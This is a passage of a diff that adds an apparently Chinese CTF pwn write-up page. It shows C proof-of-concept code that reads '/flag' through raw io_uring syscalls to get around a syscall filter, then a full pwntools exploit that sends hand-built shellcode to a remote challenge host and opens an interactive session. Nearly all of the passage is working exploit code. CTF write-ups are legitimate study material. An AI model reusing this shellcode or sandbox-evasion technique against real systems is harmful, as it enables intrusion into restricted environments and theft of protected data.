+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">uring_fd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_setup</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">params</span><span class="p">);</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sq_ring</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_SQ_RING</span><span class="p">);</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cq_ring</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_CQ_RING</span><span class="p">);</span>
+  <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqes</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_SQES</span><span class="p">);</span>
+
+  <span class="n">sqes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span><span class="p">){</span>
+      <span class="p">.</span><span class="n">opcode</span> <span class="o">=</span> <span class="n">IORING_OP_OPENAT</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">IOSQE_ASYNC</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="s">"/flag"</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">open_flags</span> <span class="o">=</span> <span class="n">O_RDONLY</span><span class="p">,</span>
+  <span class="p">};</span>
+  <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">array</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">tail</span><span class="p">))</span><span class="o">++</span><span class="p">;</span>
+  <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_enter</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">IORING_ENTER_GETEVENTS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">cq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">cq_off</span><span class="p">.</span><span class="n">cqes</span><span class="p">);</span>
+  <span class="n">opened_fd</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
+  <span class="n">read</span><span class="p">(</span><span class="n">opened_fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>编译执行，发现打印出了flag，很好，那我们直接照猫画虎把整个orw都改成这样的格式：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;err.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include "linux/io_uring.h"
+</span>
+<span class="cp">#ifndef SYS_io_uring_enter
+#define SYS_io_uring_enter 426
+#endif
+#ifndef SYS_io_uring_setup
+#define SYS_io_uring_setup 425
+#endif
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="c1">// initialize uring</span>
+  <span class="k">struct</span> <span class="n">io_uring_params</span> <span class="n">params</span> <span class="o">=</span> <span class="p">{};</span>
+  <span class="kt">int</span> <span class="n">opened_fd</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">uring_fd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_setup</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">params</span><span class="p">);</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sq_ring</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_SQ_RING</span><span class="p">);</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cq_ring</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_CQ_RING</span><span class="p">);</span>
+  <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqes</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_SQES</span><span class="p">);</span>
+
+  <span class="n">sqes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span><span class="p">){</span>
+      <span class="p">.</span><span class="n">opcode</span> <span class="o">=</span> <span class="n">IORING_OP_OPENAT</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">IOSQE_ASYNC</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="s">"/flag"</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">open_flags</span> <span class="o">=</span> <span class="n">O_RDONLY</span><span class="p">,</span>
+  <span class="p">};</span>
+  <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">array</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">tail</span><span class="p">))</span><span class="o">++</span><span class="p">;</span>
+  <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_enter</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">IORING_ENTER_GETEVENTS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">cq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">cq_off</span><span class="p">.</span><span class="n">cqes</span><span class="p">);</span>
+  <span class="n">opened_fd</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
+
+  <span class="n">sqes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span><span class="p">){</span>
+      <span class="p">.</span><span class="n">opcode</span> <span class="o">=</span> <span class="n">IORING_OP_READ</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="n">opened_fd</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mi">100</span><span class="p">,</span>
+  <span class="p">};</span>
+  <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">array</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">tail</span><span class="p">))</span><span class="o">++</span><span class="p">;</span>
+  <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_enter</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">IORING_ENTER_GETEVENTS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+  <span class="n">sqes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">io_uring_sqe</span><span class="p">){</span>
+      <span class="p">.</span><span class="n">opcode</span> <span class="o">=</span> <span class="n">IORING_OP_WRITE</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">,</span>
+      <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mi">100</span><span class="p">,</span>
+  <span class="p">};</span>
+  <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">array</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">sq_ring</span> <span class="o">+</span> <span class="n">params</span><span class="p">.</span><span class="n">sq_off</span><span class="p">.</span><span class="n">tail</span><span class="p">))</span><span class="o">++</span><span class="p">;</span>
+  <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_enter</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">IORING_ENTER_GETEVENTS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>然后编译执行后拿到了flag。</p>
+
+<p>我们直接使用编译好的poc2，打开ida，照着写一遍，这里需要注意的是，我们需要利用寄存器中的残存地址去设置一下rbp的值即可。</p>
+
+<p>完整exp：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1"># p = process('./pwn')
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'120.46.65.156'</span><span class="p">,</span> <span class="mi">32101</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+                mov rbp, rdx
+                add rbp, 0xa00  
+                mov rbx, rbp
+                sub rbx, 0xf0  
+                """</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">syscall</span><span class="p">(</span><span class="mi">425</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="s">"rbx"</span><span class="p">))</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+                 sub rbx, 0x28
+                 mov [rbx], rax
+                 mov r13, rax 
+                 """</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"r13"</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+                 mov [rbp-0x110], rax
+                 """</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"r13"</span><span class="p">,</span> <span class="mh">0x8000000</span><span class="p">))</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+                 mov [rbp-0x108], rax
+                 """</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"r13"</span><span class="p">,</span> <span class="mh">0x10000000</span><span class="p">))</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+                 mov [rbp-0x100], rax
+                 xor r13, r13
+                 mov [rax], r13
+                 mov [rax+8], r13
+                 mov [rax+0x10], r13
+                 mov [rax+0x18], r13
+                 mov [rax+0x20], r13
+                 mov [rax+0x28], r13
+                 mov [rax+0x30], r13
+                 mov [rax+0x38], r13
+                 mov rax, [rbp-0x100]
+                 mov byte ptr [rax], 0x12
+                 mov byte ptr [rax+1], 0x10
+                 mov rdx, 0x67616c662f
+                 mov [rbp+0x100], rdx
+                 mov rdx, rbp
+                 add rdx, 0x100
+                 mov [rax+0x10], rdx
+                 mov eax, [rbp-0xB0]
+                 mov edx, eax
+                 mov rax, [rbp-0x110]
+                 add rax, rdx
+                 mov     [rax], r13
+                 mov     eax, [rbp-0xC4]
+                 mov     edx, eax
+                 mov     rax, [rbp-0x110]
+                 add     rax, rdx
+                 mov     edx, [rax]
+                 add     edx, 1
+                 mov     [rax], edx
+                 mov     r12, [rbp-0x118]
+                 xor     rax, rax
+                 sub     rsp, 8
+                 push    0
+                 """</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">syscall</span><span class="p">(</span><span class="mi">426</span><span class="p">,</span> <span class="s">"r12"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+                 add rsp, 0x10
+                 mov     eax, [rbp-0x8C]
+                 mov     edx, eax
+                 mov     rax, [rbp-0x108]
+                 add     rax, rdx
+                 mov     [rbp-0xF8], rax
+                 mov     rax, [rbp-0xF8]
+                 mov     eax, [rax+8]
+                 mov     [rbp-0x114], eax
+                 lea     rdx, [rbp-0x70]
+                 mov     rax, [rbp-0x100]
+                 mov [rax], r13
+                 mov [rax+8], r13
+                 mov [rax+0x10], r13
+                 mov [rax+0x18], r13
+                 mov [rax+0x20], r13
+                 mov [rax+0x28], r13
+                 mov [rax+0x30], r13
+                 mov [rax+0x38], r13
+                 mov rax, [rbp-0x100]
+                 mov byte ptr [rax], 0x16
+                 mov     ecx, [rbp-0x114]
+                 mov     [rax+4], ecx
+                 mov     [rax+0x10], rdx
+                 mov     rbx, 0x64
+                 mov     [rax+0x18], rbx
+                 mov     edx, [rbp-0xB0]
+                 mov     rax, [rbp-0x110]
+                 add     rax, rdx
+                 mov     [rax], r13             
+                 mov     eax, [rbp-0xC4]    
+                 mov     edx, eax
+                 mov     rax, [rbp-0x110]
+                 add     rax, rdx
+                 mov     edx, [rax]
+                 add     edx, 1
+                 mov     [rax], edx
+                 mov     r12, [rbp-0x118]
+                 xor     rax, rax
+                 sub     rsp, 8
+                 push    0
+                 """</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">syscall</span><span class="p">(</span><span class="mi">426</span><span class="p">,</span> <span class="s">"r12"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+                 add rsp, 0x10
+                 lea     rdx, [rbp-0x70]
+                 mov     rax, [rbp-0x100]
+                 mov [rax], r13
+                 mov [rax+8], r13
+                 mov [rax+0x10], r13
+                 mov [rax+0x18], r13
+                 mov [rax+0x20], r13
+                 mov [rax+0x28], r13
+                 mov [rax+0x30], r13
+                 mov [rax+0x38], r13
+                 mov rax, [rbp-0x100]
+                 mov byte ptr [rax], 0x17
+                 mov     ecx, 1
+                 mov     [rax+4], ecx
+                 mov     [rax+0x10], rdx
+                 mov     rbx, 0x64
+                 mov     [rax+0x18], rbx
+                 mov     edx, [rbp-0xB0]
+                 mov     rax, [rbp-0x110]
+                 add     rax, rdx
+                 mov     [rax], r13             
+                 mov     eax, [rbp-0xC4]    
+                 mov     edx, eax
+                 mov     rax, [rbp-0x110]
+                 add     rax, rdx
+                 mov     edx, [rax]
+                 add     edx, 1
+                 mov     [rax], edx
+                 mov     r12, [rbp-0x118]
+                 xor     rax, rax
+                 sub     rsp, 8
+                 push    0
+                 """</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">syscall</span><span class="p">(</span><span class="mi">426</span><span class="p">,</span> <span class="s">"r12"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+
+
+      
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.1.0/anchor.min.js" integrity="sha256-lZaRhKri35AyJSypXXs4o6OPFTbTmUoltBbDCbdzegg=" crossorigin="anonymous"></script>
+    <script>anchors.add();</script>
+  </body>
+</html>
